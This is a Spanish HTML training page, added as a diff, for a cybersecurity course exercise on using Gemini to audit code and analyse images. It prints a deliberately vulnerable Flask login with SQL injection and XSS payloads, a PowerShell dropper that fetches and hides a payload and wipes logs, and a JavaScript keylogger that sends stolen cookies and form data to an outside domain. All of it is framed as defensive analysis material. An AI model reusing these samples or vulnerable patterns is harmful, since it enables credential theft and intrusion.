@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Practica 4: Analisis de Codigo e Imagenes | Capacitacion Ciberseguridad + IA</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #9b72cb;
+            --primary-dark: #7c4dff;
+            --secondary: #10b981;
+            --accent: #f59e0b;
+            --danger: #ef4444;
+            --dark: #f1f5f9;
+            --light: #000000;
+            --gray: #94a3b8;
+            --border: #1a1a1a;
+            --card-bg: #0a0a0a;
+            --gemini: linear-gradient(135deg, #9b72cb, #d96570, #4285f4);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--light);
+            color: var(--dark);
+            line-height: 1.7;
+        }
+
+        .hero {
+            background: var(--gemini);
+            color: white;
+            padding: 60px 20px;
+            text-align: center;
+        }
+
+        .hero h1 { font-size: 2.5rem; margin-bottom: 15px; }
+        .hero .subtitle { font-size: 1.2rem; opacity: 0.95; }
+        .badge {
+            display: inline-block;
+            background: rgba(255,255,255,0.2);
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            margin-top: 15px;
+        }
+
+        .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
+
+        .section {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 35px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #111111;
+        }
+
+        .section-icon {
+            width: 45px;
+            height: 45px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.4rem;
+            background: var(--gemini);
+        }
+
+        h2 { font-size: 1.6rem; font-weight: 600; }
+        h3 { font-size: 1.2rem; font-weight: 600; margin: 25px 0 12px; color: var(--dark); }
+        h4 { font-size: 1rem; font-weight: 600; margin: 15px 0 8px; color: var(--gray); }
+        p { color: var(--gray); margin-bottom: 12px; }
+
+        .objetivo {
+            background: rgba(155, 114, 203, 0.15);
+            border-left: 4px solid var(--primary);
+            padding: 20px;
+            border-radius: 0 12px 12px 0;
+            margin: 20px 0;
+        }
+
+        .objetivo-title {
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 8px;
+            font-size: 1.1rem;
+        }
+
+        .tip {
+            background: rgba(16, 185, 129, 0.15);
+            border-left: 4px solid var(--secondary);
+            padding: 18px;
+            border-radius: 0 12px 12px 0;
+            margin: 18px 0;
+        }
+
+        .tip-title {
+            font-weight: 600;
+            color: var(--secondary);
+            margin-bottom: 6px;
+        }
+
+        .warning {
+            background: rgba(245, 158, 11, 0.15);
+            border-left: 4px solid var(--accent);
+            padding: 18px;
+            border-radius: 0 12px 12px 0;
+            margin: 18px 0;
+        }
+
+        .warning-title {
+            font-weight: 600;
+            color: var(--accent);
+            margin-bottom: 6px;
+        }
+
+        .danger-box {
+            background: rgba(239, 68, 68, 0.15);
+            border-left: 4px solid var(--danger);
+            padding: 18px;
+            border-radius: 0 12px 12px 0;
+            margin: 18px 0;
+        }
+
+        .danger-title {
+            font-weight: 600;
+            color: var(--danger);
+            margin-bottom: 6px;
+        }
+
+        .ejercicio-box {
+            background: rgba(233, 30, 99, 0.15);
+            border: 2px solid #e91e63;
+            border-radius: 14px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+
+        .ejercicio-box h4 {
+            color: #f48fb1;
+            font-size: 1.15rem;
+            margin: 0 0 15px;
+        }
+
+        .ejercicio-box ol, .ejercicio-box ul {
+            margin-left: 20px;
+            color: var(--dark);
+        }
+
+        .ejercicio-box li { margin-bottom: 10px; }
+
+        .code-block {
+            background: #111111;
+            color: #e2e8f0;
+            padding: 18px;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            margin: 12px 0;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            border: 1px solid #1a1a1a;
+        }
+
+        .escenario {
+            background: rgba(66, 133, 244, 0.15);
+            border: 2px solid #4285f4;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .escenario-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .escenario-header h4 {
+            color: #8ab4f8;
+            margin: 0;
+        }
+
+        .steps {
+            counter-reset: step;
+        }
+
+        .step {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #111111;
+            border-radius: 10px;
+            border-left: 3px solid var(--primary);
+        }
+
+        .step::before {
+            counter-increment: step;
+            content: counter(step);
+            background: var(--primary);
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        .step-content h4 {
+            margin: 0 0 5px;
+            color: var(--dark);
+        }
+
+        .step-content p { margin: 0; font-size: 0.95rem; }
+
+        ul, ol { margin-left: 20px; margin-bottom: 15px; }
+        li { margin-bottom: 8px; color: var(--gray); }
+
+        .entregable {
+            background: rgba(16, 185, 129, 0.2);
+            border: 2px solid var(--secondary);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .entregable h4 {
+            color: var(--secondary);
+            margin-top: 0;
+        }
+
+        .vulnerabilidad {
+            background: rgba(239, 68, 68, 0.1);
+            border: 2px dashed var(--danger);
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .vulnerabilidad h5 {
+            color: var(--danger);
+            margin: 0 0 10px;
+            font-size: 1rem;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+            background: #0a0a0a;
+            color: white;
+        }
+
+        .footer p { color: rgba(255,255,255,0.7); }
+        .footer a { color: var(--primary); }
+        .signature { font-size: 1.3rem; margin-bottom: 10px; }
+
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 1.8rem; }
+            .section { padding: 25px; }
+            .code-block { font-size: 0.75rem; }
+        }
+    </style>
+</head>
+<body>
+
+<header class="hero">
+    <h1>Practica 4: Analisis de Codigo e Imagenes</h1>
+    <p class="subtitle">Encuentra vulnerabilidades y analiza evidencia visual con IA</p>
+    <span class="badge">Nivel Avanzado | 45-60 min</span>
+</header>
+
+<main class="container">
+
+    <!-- INTRODUCCION -->
+    <section class="section">
+        <div class="section-header">
+            <div class="section-icon">💻</div>
+            <h2>Introduccion</h2>
+        </div>
+
+        <p>En esta practica usaras Gemini para analizar codigo en busca de vulnerabilidades de seguridad y para interpretar imagenes relacionadas con ciberseguridad (diagramas de red, capturas de errores, evidencia de incidentes).</p>
+
+        <div class="objetivo">
+            <div class="objetivo-title">🎯 Objetivos de esta practica</div>
+            <ul>
+                <li>Identificar vulnerabilidades de seguridad comunes en codigo</li>
+                <li>Aprender a pedir analisis de seguridad efectivos a Gemini</li>
+                <li>Analizar diagramas de red y detectar problemas de arquitectura</li>
+                <li>Usar vision por computadora para analisis forense basico</li>
+            </ul>
+        </div>
+
+        <div class="warning">
+            <div class="warning-title">⚠️ Nota importante</div>
+            <p>El codigo de esta practica contiene vulnerabilidades <strong>intencionales</strong> para fines educativos. <strong>NUNCA</strong> uses codigo vulnerable en produccion.</p>
+        </div>
+    </section>
+
+    <!-- EJERCICIO 1: SQL INJECTION -->
+    <section class="section">
+        <div class="section-header">
+            <div class="section-icon">💻</div>
+            <h2>Ejercicio 1: Encuentra la Inyeccion SQL</h2>
+        </div>
+
+        <p>Analiza este codigo de login en Python/Flask y encuentra las vulnerabilidades.</p>
+
+        <div class="escenario">
+            <div class="escenario-header">
+                <h4>📋 Escenario</h4>
+            </div>
+            <p>Un desarrollador junior escribio este codigo de autenticacion. Tu trabajo es revisar la seguridad antes de que llegue a produccion.</p>
+        </div>
+
+        <h3>Codigo a analizar:</h3>
+        <div class="code-block"># login.py - Sistema de autenticacion
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+
+    # Conectar a la base de datos
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+
+    # Buscar usuario
+    query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
+    cursor.execute(query)
+
+    user = cursor.fetchone()
+    conn.close()
+
+    if user:
+        return "Login exitoso! Bienvenido " + username
+    else:
+        return "Usuario o contraseña incorrectos"
+
+@app.route('/search')
+def search():
+    term = request.args.get('q', '')
+    return f"<h1>Resultados para: {term}</h1>"
+
+if __name__ == '__main__':
+    app.run(debug=True)</div>
+
+        <h3>Tu tarea:</h3>
+        <div class="ejercicio-box">
+            <h4>🔍 Analisis de seguridad</h4>
+            <p>Copia este codigo en Gemini con el siguiente prompt:</p>
+            <div class="code-block">"Actua como un auditor de seguridad. Analiza este codigo Python/Flask y encuentra TODAS las vulnerabilidades de seguridad.
+
+Para cada vulnerabilidad:
+1. Nombra el tipo de vulnerabilidad (OWASP Top 10 si aplica)
+2. Señala la linea exacta del problema
+3. Explica como un atacante podria explotarla
+4. Muestra el codigo corregido
+
+Codigo:
+[pegar codigo aqui]"</div>
+        </div>
+
+        <h3>Vulnerabilidades esperadas:</h3>
+        <div class="vulnerabilidad">
+            <h5>🔴 SQL Injection (Linea 16-17)</h5>
+            <p>La query concatena input del usuario directamente. Un atacante puede usar: <code>admin' OR '1'='1' --</code></p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>🔴 XSS Reflejado (Linea 27)</h5>
+            <p>El parametro 'term' se inserta en HTML sin sanitizar. Un atacante puede inyectar: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>🟡 Debug mode en produccion (Linea 30)</h5>
+            <p><code>debug=True</code> expone informacion sensible y permite ejecucion de codigo</p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>🟡 Contraseñas en texto plano</h5>
+            <p>Las contraseñas se comparan directamente, sin hash</p>
+        </div>
+
+        <h3>Pide la version corregida:</h3>
+        <div class="code-block">"Ahora muestra el codigo corregido con:
+- Queries parametrizadas para prevenir SQL injection
+- Sanitizacion de output para prevenir XSS
+- Hash de contraseñas con bcrypt
+- Modo debug desactivado
+- Manejo de errores apropiado"</div>
+
+        <div class="entregable">
+            <h4>✅ Entregable del Ejercicio 1</h4>
+            <ul>
+                <li>Lista de al menos 4 vulnerabilidades encontradas</li>
+                <li>Explicacion de como explotar cada una</li>
+                <li>Codigo corregido generado por Gemini</li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- EJERCICIO 2: ANALISIS DE SCRIPT -->
+    <section class="section">
+        <div class="section-header">
+            <div class="section-icon">🔍</div>
+            <h2>Ejercicio 2: Analiza un Script Sospechoso</h2>
+        </div>
+
+        <p>Este script fue encontrado en una computadora comprometida. Usa Gemini para entender que hace.</p>
+
+        <div class="escenario">
+            <div class="escenario-header">
+                <h4>📋 Escenario</h4>
+            </div>
+            <p>Durante una investigacion forense, encontraste este script PowerShell en la carpeta Temp de un usuario. Necesitas analizar que hace sin ejecutarlo.</p>
+        </div>
+
+        <h3>Script sospechoso:</h3>
+        <div class="code-block"># update_service.ps1
+$ErrorActionPreference = "SilentlyContinue"
+
+$b64 = "aHR0cDovLzE5Mi4xNjguMS4xMDA6ODQ0My9wYXlsb2FkLmV4ZQ=="
+$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+
+$dest = "$env:TEMP\svchost.exe"
+
+(New-Object Net.WebClient).DownloadFile($url, $dest)
+
+$reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+New-ItemProperty -Path $reg -Name "WindowsUpdate" -Value $dest -Force
+
+Start-Process $dest -WindowStyle Hidden
+
+$logPath = "$env:USERPROFILE\AppData\Local\Microsoft\Windows\PowerShell\history.txt"
+if (Test-Path $logPath) { Remove-Item $logPath -Force }
+
+$eventLogs = @("Security", "System", "Application")
+foreach ($log in $eventLogs) {
+    wevtutil cl $log
+}</div>
+
+        <h3>Tu tarea:</h3>
+        <div class="ejercicio-box">
+            <h4>🔍 Analisis forense</h4>
+            <p>Pide a Gemini que analice el script:</p>
+            <div class="code-block">"Actua como un analista de malware. Analiza este script PowerShell linea por linea y explicame:
+
+1. Que hace cada seccion del codigo
+2. Cuales son los indicadores de compromiso (IOCs)
+3. Que tecnicas MITRE ATT&CK utiliza
+4. Que evidencia deja en el sistema
+5. Como detectar y remediar esta infeccion
+
+Script:
+[pegar script aqui]"</div>
+        </div>
+
+        <h3>Analisis esperado:</h3>
+        <div class="vulnerabilidad">
+            <h5>Linea 4-5: Decodificacion de URL</h5>
+            <p>La URL esta ofuscada en Base64. Decodificada es: <code>http://192.168.1.100:8443/payload.exe</code></p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>Linea 7-9: Descarga de payload</h5>
+            <p>Descarga un ejecutable y lo guarda como "svchost.exe" (nombre legitimo para camuflaje)</p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>Linea 11-12: Persistencia</h5>
+            <p>Añade entrada al registro Run para ejecutarse al inicio</p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>Linea 14: Ejecucion oculta</h5>
+            <p>Ejecuta el payload sin ventana visible</p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>Linea 16-21: Anti-forense</h5>
+            <p>Borra historial de PowerShell y limpia logs de eventos</p>
+        </div>
+
+        <div class="tip">
+            <div class="tip-title">💡 IOCs para reportar</div>
+            <ul>
+                <li>URL: http://192.168.1.100:8443/payload.exe</li>
+                <li>Archivo: %TEMP%\svchost.exe</li>
+                <li>Registro: HKCU\...\Run\WindowsUpdate</li>
+                <li>Tecnicas MITRE: T1059.001, T1547.001, T1070.001</li>
+            </ul>
+        </div>
+
+        <div class="entregable">
+            <h4>✅ Entregable del Ejercicio 2</h4>
+            <ul>
+                <li>Analisis completo del script</li>
+                <li>Lista de IOCs extraidos</li>
+                <li>Mapeo a MITRE ATT&CK</li>
+                <li>Pasos de remediacion</li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- EJERCICIO 3: ANALISIS DE IMAGENES -->
+    <section class="section">
+        <div class="section-header">
+            <div class="section-icon">🖼️</div>
+            <h2>Ejercicio 3: Analisis de Diagrama de Red</h2>
+        </div>
+
+        <p>Ahora usaras la capacidad de vision de Gemini para analizar un diagrama de red.</p>
+
+        <div class="escenario">
+            <div class="escenario-header">
+                <h4>📋 Escenario</h4>
+            </div>
+            <p>Te contrataron para auditar la seguridad de una pequeña empresa. Te dieron este diagrama de su red. Debes identificar problemas de seguridad.</p>
+        </div>
+
+        <h3>Opcion A: Usa una imagen real</h3>
+        <p>Busca en Google Imagenes: "small business network diagram" y sube una a Gemini.</p>
+
+        <h3>Opcion B: Describe este diagrama a Gemini</h3>
+        <div class="code-block">Analiza esta arquitectura de red de una pequeña empresa:
+
+INTERNET
+    |
+[Router ISP] -- IP Publica: 200.x.x.x
+    |
+[Switch Principal]
+    |
+    +-- [Servidor Web] -- IP: 192.168.1.10, Puerto 80 abierto a internet
+    |
+    +-- [Servidor BD] -- IP: 192.168.1.20, MySQL en puerto 3306
+    |
+    +-- [NAS Backup] -- IP: 192.168.1.30, SMB compartido
+    |
+    +-- [PCs Empleados] -- DHCP: 192.168.1.100-150
+    |
+    +-- [WiFi "EmpresaWiFi"] -- WPA2, password: empresa123
+    |
+    +-- [Impresora Red] -- IP: 192.168.1.200, panel admin sin password
+
+Notas:
+- No hay firewall dedicado
+- El router tiene DMZ apuntando al servidor web
+- Todos los equipos estan en la misma VLAN
+- No hay segmentacion de red</div>
+
+        <div class="ejercicio-box">
+            <h4>🔍 Pide el analisis</h4>
+            <div class="code-block">"Eres un consultor de seguridad de redes. Analiza esta arquitectura y:
+
+1. Identifica TODOS los problemas de seguridad (minimo 5)
+2. Clasifica cada problema por severidad (Critica/Alta/Media/Baja)
+3. Explica el riesgo de cada problema
+4. Proporciona recomendaciones especificas de remediacion
+5. Dibuja como deberia verse la arquitectura segura (describe en texto)"</div>
+        </div>
+
+        <h3>Problemas esperados:</h3>
+        <div class="vulnerabilidad">
+            <h5>🔴 CRITICA: Sin firewall + DMZ mal configurada</h5>
+            <p>El servidor web tiene acceso directo a la red interna</p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>🔴 CRITICA: Sin segmentacion de red</h5>
+            <p>Un atacante que comprometa el WiFi tiene acceso a servidores y backups</p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>🟠 ALTA: Contraseña WiFi debil</h5>
+            <p>"empresa123" es facil de adivinar o crackear</p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>🟠 ALTA: MySQL expuesto</h5>
+            <p>Puerto 3306 accesible desde cualquier equipo de la red</p>
+        </div>
+
+        <div class="vulnerabilidad">
+            <h5>🟡 MEDIA: Impresora sin autenticacion</h5>
+            <p>Puede ser usada para movimiento lateral o exfiltracion</p>
+        </div>
+
+        <div class="entregable">
+            <h4>✅ Entregable del Ejercicio 3</h4>
+            <ul>
+                <li>Lista de al menos 5 problemas de seguridad</li>
+                <li>Clasificacion por severidad</li>
+                <li>Propuesta de arquitectura segura</li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- EJERCICIO 4: CAPTURA DE PANTALLA -->
+    <section class="section">
+        <div class="section-header">
+            <div class="section-icon">📸</div>
+            <h2>Ejercicio 4: Analiza una Captura de Error</h2>
+        </div>
+
+        <p>Practica analizar capturas de pantalla de errores o mensajes sospechosos.</p>
+
+        <div class="escenario">
+            <div class="escenario-header">
+                <h4>📋 Escenario</h4>
+            </div>
+            <p>Un usuario te manda una captura de pantalla diciendo "me salio esto raro". Debes analizarla rapidamente.</p>
+        </div>
+
+        <h3>Opcion A: Usa capturas reales</h3>
+        <p>Toma una captura de cualquier error en tu computadora y subela a Gemini con:</p>
+        <div class="code-block">"Analiza esta captura de pantalla:
+1. Que significa este mensaje/error?
+2. Es normal o es señal de algo malicioso?
+3. Que debo hacer?"</div>
+
+        <h3>Opcion B: Simula el escenario</h3>
+        <p>Describe este pop-up a Gemini:</p>
+        <div class="code-block">"Un usuario me mando esta descripcion de un pop-up que le aparecio:
+
+VENTANA EMERGENTE:
+Titulo: 'Microsoft Security Alert'
+Icono: Escudo rojo con X
+Texto: 'Your computer is infected with 5 viruses!
+Your personal data is at risk.
+Call Microsoft Support immediately: 1-888-XXX-XXXX
+Do not turn off your computer!'
+Botones: [Scan Now] [Call Support]
+
+El usuario dice que aparecio mientras navegaba.
+
+1. Es esto legitimo o es una estafa?
+2. Que tipo de estafa es?
+3. Que debe hacer el usuario?
+4. Como prevenir esto en el futuro?"</div>
+
+        <div class="tip">
+            <div class="tip-title">💡 Respuesta esperada</div>
+            <p>Esto es una estafa de "Tech Support Scam". Microsoft nunca muestra pop-ups con numeros de telefono. El usuario debe cerrar el navegador (Ctrl+Alt+Del si esta bloqueado), NO llamar, y ejecutar un antivirus real.</p>
+        </div>
+
+        <div class="entregable">
+            <h4>✅ Entregable del Ejercicio 4</h4>
+            <ul>
+                <li>Analisis de al menos 2 capturas/descripciones</li>
+                <li>Identificacion correcta de si es legitimo o malicioso</li>
+                <li>Recomendaciones para el usuario</li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- EJERCICIO INTEGRADOR -->
+    <section class="section">
+        <div class="section-header">
+            <div class="section-icon">🏆</div>
+            <h2>Ejercicio Integrador: Investigacion Completa</h2>
+        </div>
+
+        <p>Combina analisis de codigo e imagenes en un escenario realista.</p>
+
+        <div class="escenario">
+            <div class="escenario-header">
+                <h4>📋 Escenario</h4>
+            </div>
+            <p>Durante una auditoria de seguridad, encontraste un archivo JavaScript sospechoso en el servidor web y un diagrama de la infraestructura. Debes analizar ambos y escribir un reporte.</p>
+        </div>
+
+        <h3>Archivo sospechoso (script.js):</h3>
+        <div class="code-block">// analytics.js - Tracking script
+(function() {
+    var data = {
+        cookies: document.cookie,
+        url: window.location.href,
+        keys: [],
+        forms: []
+    };
+
+    // Capture keystrokes
+    document.addEventListener('keypress', function(e) {
+        data.keys.push(e.key);
+        if (data.keys.length > 50) {
+            sendData();
+            data.keys = [];
+        }
+    });
+
+    // Capture form submissions
+    document.querySelectorAll('form').forEach(function(form) {
+        form.addEventListener('submit', function(e) {
+            var formData = new FormData(form);
+            data.forms.push(Object.fromEntries(formData));
+        });
+    });
+
+    function sendData() {
+        var img = new Image();
+        img.src = 'https://analytics-cdn.com/collect?d=' +
+                  btoa(JSON.stringify(data));
+    }
+
+    // Send data every 30 seconds
+    setInterval(sendData, 30000);
+
+    // Send on page unload
+    window.addEventListener('beforeunload', sendData);
+})();</div>
+
+        <h3>Tu mision:</h3>
+        <div class="steps">
+            <div class="step">
+                <div class="step-content">
+                    <h4>Analiza el JavaScript</h4>
+                    <p>Pide a Gemini que identifique que hace este "script de analytics"</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-content">
+                    <h4>Identifica IOCs</h4>
+                    <p>Extrae dominios, comportamientos maliciosos, y tecnicas usadas</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-content">
+                    <h4>Clasifica la amenaza</h4>
+                    <p>¿Que tipo de malware es? ¿Que MITRE ATT&CK aplica?</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-content">
+                    <h4>Escribe recomendaciones</h4>
+                    <p>¿Como remediarlo? ¿Como prevenir infecciones similares?</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="danger-box">
+            <div class="danger-title">🚨 Este script es un keylogger/stealer</div>
+            <ul>
+                <li>Roba cookies de sesion</li>
+                <li>Captura teclas presionadas (keylogger)</li>
+                <li>Intercepta datos de formularios (credenciales)</li>
+                <li>Exfiltra datos via imagen (tecnica de beaconing)</li>
+                <li>IOC: analytics-cdn.com (dominio de exfiltracion)</li>
+            </ul>
+        </div>
+
+        <div class="entregable">
+            <h4>✅ Entregable Final</h4>
+            <ul>
+                <li>Analisis completo del JavaScript malicioso</li>
+                <li>Lista de IOCs y mapeo MITRE ATT&CK</li>
+                <li>Reporte ejecutivo de 1 pagina con hallazgos y recomendaciones</li>
+                <li>Pasos de remediacion inmediata</li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- REFLEXION -->
+    <section class="section">
+        <div class="section-header">
+            <div class="section-icon">💭</div>
+            <h2>Reflexion Final</h2>
+        </div>
+
+        <div class="ejercicio-box">
+            <h4>🤔 Preguntas de reflexion</h4>
+            <ol>
+                <li>¿Gemini identifico todas las vulnerabilidades que esperabas?</li>
+                <li>¿Hubo algun falso positivo o algo que Gemini malinterpreto?</li>
+                <li>¿Como usarias estas capacidades en tu trabajo diario?</li>
+                <li>¿Que limitaciones encontraste en el analisis de codigo/imagenes?</li>
+            </ol>
+        </div>
+
+        <div class="warning">
+            <div class="warning-title">⚠️ Recordatorio importante</div>
+            <p>Gemini es una <strong>herramienta de apoyo</strong>, no un reemplazo para expertise en seguridad. Siempre verifica sus hallazgos manualmente, especialmente en auditorias reales.</p>
+        </div>
+
+        <div class="tip">
+            <div class="tip-title">📌 Siguiente paso</div>
+            <p>Has completado todas las practicas de Gemini Avanzado. El siguiente paso es el Quiz final para evaluar tu conocimiento.</p>
+        </div>
+    </section>
+
+</main>
+
+<footer class="footer">
+    <div class="signature">🔥💀📜🙏</div>
+    <p>📚 Practica 4: Analisis de Codigo e Imagenes | Capacitacion Ciberseguridad + IA</p>
+    <p>Creado por <strong>Randhy Paul</strong> para <strong>Gilberto Amadis</strong></p>
+    <p>Material de <a href="https://soulcore.dev" target="_blank">SOUL CORE</a> — 2026</p>
+</footer>
+
+</body>
+</html>
